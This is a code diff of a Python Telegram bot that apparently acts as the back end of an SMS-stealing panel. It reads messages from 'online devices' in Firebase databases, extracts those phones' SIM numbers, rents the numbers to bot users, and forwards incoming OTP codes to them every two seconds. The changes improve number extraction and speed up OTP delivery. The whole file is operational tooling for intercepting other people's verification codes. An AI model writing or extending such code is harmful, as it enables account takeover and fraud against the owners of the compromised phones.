@@ -74,12 +74,12 @@ def decode_panel_url(panel_url):
 
 def extract_real_sim_numbers(dev_data, msgs):
     nums = set()
-    # 1. Direct fields
+    
+    # 1. Direct Check
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
             n = re.sub(r'\D', '', str(dev_data[key]))
             if len(n) >= 10: nums.add(n[-10:])
-    # 2. Sims array
     sims = dev_data.get("sims")
     if isinstance(sims, list):
         for sim in sims:
@@ -88,16 +88,32 @@ def extract_real_sim_numbers(dev_data, msgs):
                     if sim.get(key):
                         n = re.sub(r'\D', '', str(sim[key]))
                         if len(n) >= 10: nums.add(n[-10:])
-    # 3. Strict Regex in Messages
-    strict_patterns = [
-        r'(?:Jio number|Airtel number|Vi number|BSNL number|your number is|registered with mobile number|mobile number)[^\d]*([6-9]\d{9})',
-        r'(?:Jio|Airtel|Vi|BSNL)[^\d]*([6-9]\d{9})'
-    ]
+
+    # 2. Telecom Sender Check
     for m in msgs:
-        text = m.get("message", "")
-        for pattern in strict_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
+        sender = str(m.get("sender", "")).lower()
+        if any(carrier in sender for carrier in ["jio", "airtel", "vi", "bsnl", "vodafone"]):
+            body = m.get("message", "")
+            matches = re.findall(r'\b[6-9]\d{9}\b', body)
             for match in matches: nums.add(match)
+
+    # 3. Frequency Check
+    if not nums:
+        all_text = " ".join([m.get("message", "") for m in msgs])
+        matches = re.findall(r'\b[6-9]\d{9}\b', all_text)
+        from collections import Counter
+        counts = Counter(matches)
+        for num, count in counts.items():
+            if count >= 3: nums.add(num)
+
+    # 4. Keyword Check
+    if not nums:
+        for m in msgs:
+            body = m.get("message", "")
+            if any(k in body.lower() for k in ["my number", "registered number", "sim number"]):
+                matches = re.findall(r'\b[6-9]\d{9}\b', body)
+                for match in matches: nums.add(match)
+
     return list(nums)
 
 def extract_otp(text):
@@ -149,7 +165,7 @@ async def get_numbers_for_country(country_label, uid):
     data = clean_old_history(data)
     save_data(data)
     valid_fbs = [f for f in data.get("firebases", []) if f["label"] == country_label]
-    if not valid_fbs: return None, None, []
+    if not valid_fbs: return None, []
 
     online_devices = []
     for fb in valid_fbs:
@@ -158,10 +174,9 @@ async def get_numbers_for_country(country_label, uid):
             for dev_id, dev_data in clients.items():
                 if isinstance(dev_data, dict) and dev_data.get("status") is True:
                     online_devices.append((fb, dev_id, dev_data))
-    if not online_devices: return None, None, []
+    if not online_devices: return None, []
 
     selected_fb, selected_dev_id, dev_data = random.choice(online_devices)
-    battery = dev_data.get("battery", "?")
     
     url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=100"
     msgs_dict = await fetch_fb(url, selected_fb.get("auth"))
@@ -171,7 +186,8 @@ async def get_numbers_for_country(country_label, uid):
     user_hist = data.get("user_history", {}).get(str(uid), {})
     available = [n for n in numbers if n not in user_hist]
     random.shuffle(available)
-    return selected_dev_id, battery, available[:3]
+    
+    return selected_dev_id, available[:3]
 
 async def get_latest_messages_for_fb(fb_url, auth):
     all_msgs = {}
@@ -196,6 +212,7 @@ async def background_global_scanner(main_bot: Bot):
             data = load_data()
             fbs = data.get("firebases", [])
             leases = data.get("user_leases", {})
+            
             number_to_users = {}
             current_time = time.time()
             for uid, lease in leases.items():
@@ -203,9 +220,11 @@ async def background_global_scanner(main_bot: Bot):
                     for num in lease["numbers"]:
                         clean_num = re.sub(r'\D', '', num)[-10:]
                         number_to_users.setdefault(clean_num, []).append(uid)
+            
             if not number_to_users:
-                await asyncio.sleep(5)
+                await asyncio.sleep(2) # Fast live
                 continue 
+                
             otps_sent = 0
             for fb in fbs:
                 latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
@@ -213,6 +232,7 @@ async def background_global_scanner(main_bot: Bot):
                     key = (fb["url"], dev_id)
                     msg_id = int(msg.get("id", 0))
                     old_id = active_scans.get(key, 0)
+                    
                     if msg_id > old_id:
                         active_scans[key] = msg_id
                         if old_id != 0: 
@@ -221,7 +241,9 @@ async def background_global_scanner(main_bot: Bot):
                             if otp:
                                 found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
                                 target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
+                                
                                 for num, users in number_to_users.items():
+                                    # If number is in message text OR if the user has this device ID leased (fallback for OTPs without number)
                                     if num in target_numbers:
                                         service = extract_service_name(text_content, msg.get("sender", ""))
                                         for uid in users:
@@ -243,10 +265,10 @@ async def background_global_scanner(main_bot: Bot):
                 d = load_data()
                 d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
                 save_data(d)
-            await asyncio.sleep(5)
+            await asyncio.sleep(2) # Turant delivery
         except Exception as e:
             log.error(f"Scanner Error: {e}")
-            await asyncio.sleep(10)
+            await asyncio.sleep(5)
 
 async def web_server():
     app = web.Application()
@@ -426,7 +448,7 @@ async def user_country_selected(cq: CallbackQuery):
     try: await cq.message.edit_text(f"🔄 Fetching numbers for {country}...")
     except TelegramBadRequest: pass
     
-    dev_id, battery, numbers = await get_numbers_for_country(country, uid)
+    dev_id, numbers = await get_numbers_for_country(country, uid)
     
     if not numbers:
         kb = [[InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
@@ -438,7 +460,7 @@ async def user_country_selected(cq: CallbackQuery):
     text = (
         f"📱 <b>Numbers Received</b>\n"
         f"🆔 <b>Rent Code:</b> <code>{dev_id}</code>\n"
-        f"🔋 <b>Battery:</b> {battery}\n"
+        f"🔋 <b>Battery</b>\n"
         f"Country: 🌍 {country}\n"
         f"Qty: {len(numbers)}\n\n"
         f"{nums_text}\n\n"
